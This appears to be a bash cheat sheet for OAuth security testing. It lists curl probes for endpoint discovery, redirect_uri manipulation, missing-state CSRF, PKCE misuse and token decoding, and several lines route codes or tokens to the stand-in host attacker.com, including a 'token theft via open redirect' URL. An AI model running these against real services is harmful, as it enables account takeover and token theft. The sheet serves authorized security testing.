#!/bin/bash
# ==============================================
# OAUTH SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. RECONNAISSANCE
# -----------------

# Discover OAuth endpoints
curl -s https://target.com/.well-known/oauth-authorization-server
curl -s https://target.com/.well-known/openid-configuration

# Common endpoints to check:
# /oauth/authorize
# /oauth/token
# /oauth/userinfo
# /.well-known/openid-configuration

# 2. BASIC FLOW TESTING
# --------------------

# Authorization Code Flow
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback&scope=openid%20profile&state=123"

# Implicit Flow (legacy)
curl -v "https://target.com/oauth/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback&scope=openid%20profile&state=123"

# 3. COMMON VULNERABILITIES
# -------------------------

# 3.1 Insecure Redirect URI
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com&state=123"

# 3.2 Authorization Code Leak via Referer
curl -v -H "Referer: https://attacker.com" "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID"

# 3.3 CSRF Attack (State Parameter Missing)
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://legitimate.com/callback"

# 4. TOKEN MANIPULATION
# ---------------------

# 4.1 Access Token Inspection
echo "ACCESS_TOKEN" | cut -d '.' -f 2 | base64 -d | jq

# 4.2 JWT Vulnerabilities (see JWT Testing section)
jwt_tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

# 5. CLIENT TESTING
# ----------------

# 5.1 Client Secret in Source Code
curl -s https://target.com/static/js/app.js | grep -i "client_secret"

# 5.2 PKCE Bypass (if implemented incorrectly)
curl -v "https://target.com/oauth/token" -d "client_id=CLIENT_ID&code_verifier=weakvalue&grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://client.com/callback"

# 6. ADVANCED ATTACKS
# ------------------

# 6.1 Token Theft via Open Redirect
curl -v "https://target.com/logout?redirect=https://attacker.com/steal?token="

# 6.2 IDP Mix-Up Attack
# Requires specialized tools like oauth2_flow_analyzer

# 7. TOOLS
# --------

# 7.1 OAuth Tester (Python)
python3 oauth_tester.py -u https://target.com -c CLIENT_ID -r https://attacker.com

# 7.2 Burp Suite OAuth Plugin
# Available in BApp Store

# 7.3 Postman Collections
# Manually test OAuth flows

# 8. AUTOMATED SCANNING
# --------------------

# 8.1 Nuclei Templates
nuclei -t ~/nuclei-templates/oauth/ -u https://target.com -o oauth_scan.txt

# ==============================================
# TIPS:
# 1. Always test with multiple client_ids
# 2. Check for token storage issues in mobile apps
# 3. Verify all redirect_uri validations
# 4. Test both front-channel and back-channel flows
# ==============================================

# RECOMMENDED WORDLISTS:
# ----------------------
# /usr/share/wordlists/oauth/common_clients.txt
# /usr/share/wordlists/oauth/common_scopes.txt
# /usr/share/wordlists/oauth/common_redirects.txt

# INSTALLATION:
# -------------
# jwt_tool: pip install jwt-tool
# oauth_tester: https://github.com/ticarpi/oauth_tester
# nuclei: go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Manual Testing Flow (Burp Suite):
# Intercept OAuth authorization request
# Test parameter manipulation:
# - redirect_uri
# - state
# - scope
# - response_type
# Analyze token responses
# Test token usage/validation